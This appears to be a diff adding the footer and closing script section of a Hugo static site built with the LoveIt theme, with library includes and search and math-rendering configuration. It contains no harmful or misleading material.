+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
